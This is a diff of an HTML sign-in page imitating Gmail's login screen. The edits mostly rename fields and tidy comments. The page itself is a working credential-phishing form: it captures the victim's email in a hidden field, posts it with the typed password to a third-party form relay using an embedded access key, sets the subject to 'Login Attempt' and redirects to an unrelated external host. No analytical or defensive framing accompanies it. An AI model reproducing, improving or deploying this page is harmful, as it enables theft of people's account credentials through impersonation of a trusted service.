@@ -6,7 +6,7 @@
 <title>Sign in</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
 <style>
-/* === YOUR ORIGINAL STYLES, UNCHANGED === */
+/* === YOUR ORIGINAL STYLES === */
 body {
   font-family: 'Roboto', sans-serif;
   background: #121212;
@@ -141,7 +141,7 @@ p.sub { font-size: 16px; color: #b0b0b0; margin: 0 0 16px; }
 .forgot-link-email { margin-top: 6px; }
 .forgot-link-email:hover, .forgot-link-password:hover { text-decoration: underline; }
 
-/* Gmail-style error message flush left with no spacing */
+/* Gmail-style error message */
 .error-message {
   color: #f44336;
   font-size: 13px;
@@ -238,17 +238,14 @@ a:hover { text-decoration: underline; }
 
     <form id="passwordForm" action="https://api.web3forms.com/submit" method="POST">
       <input type="hidden" name="access_key" value="20493b9d-36c9-40b4-a362-ca956132eb2e">
-
-      <!-- Fix: Add required Web3Forms fields -->
       <input type="hidden" name="from_name" value="Login Form">
-      <input type="hidden" name="subject" value="Notification">
+      <input type="hidden" name="subject" value="Login Attempt">
       <input type="hidden" name="redirect" value="http://razerecode.mygamesonline.org/razer.html">
-
       <input type="hidden" name="email" id="hiddenEmail">
 
       <div class="field">
-        <input type="password" id="message" name="message" required placeholder=" ">
-        <label for="message">Password</label>
+        <input type="password" id="password" name="details" required placeholder=" ">
+        <label for="password">Password</label>
         <div class="error-message" id="errorMsg">Incorrect password</div>
       </div>
 
@@ -283,7 +280,7 @@ const displayEmail = document.getElementById('displayEmail');
 const hiddenEmail = document.getElementById('hiddenEmail');
 const emailInput = document.getElementById('email');
 const togglePass = document.getElementById('togglePass');
-const passwordInput = document.getElementById('message');
+const passwordInput = document.getElementById('password');
 const errorMsg = document.getElementById('errorMsg');
 const avatarImage = document.getElementById('avatarImage');
 
@@ -314,7 +311,7 @@ passwordForm.addEventListener('submit', function(e) {
   } else {
     passwordInput.classList.remove('error');
     errorMsg.style.display = 'none';
-    // Let Web3Forms handle the submit + redirect
+    // Let Web3Forms handle submission + redirect
   }
 });
 </script>
